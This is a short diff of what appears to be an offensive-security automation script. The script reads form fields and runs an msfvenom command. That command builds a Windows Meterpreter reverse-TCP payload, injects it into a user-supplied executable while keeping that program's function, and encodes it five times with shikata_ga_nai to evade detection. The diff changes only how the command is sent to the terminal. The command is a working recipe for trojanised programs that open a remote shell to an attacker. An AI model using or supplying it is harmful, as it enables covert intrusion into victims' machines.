@@ -16,5 +16,5 @@ LPORT=${form_data["lport"]}
 INPUT_FILE=${form_data["input_file"]}
 OUTPUT_FILE=${form_data["output_file"]}
 
-paste_command "msfvenom windows/x86/meterpreter_reverse_tcp LHOST=${KALI_IP} LPORT=${LPORT} -k -x ${INPUT_FILE} -e x86/shikata_ga_nai -a x86 --platform windows -o ${OUTPUT_FILE} -i 5"
-xdotool key Return
+execute_command "msfvenom windows/x86/meterpreter_reverse_tcp LHOST=${KALI_IP} LPORT=${LPORT} -k -x ${INPUT_FILE} -e x86/shikata_ga_nai -a x86 --platform windows -o ${OUTPUT_FILE} -i 5"
+create_new_line
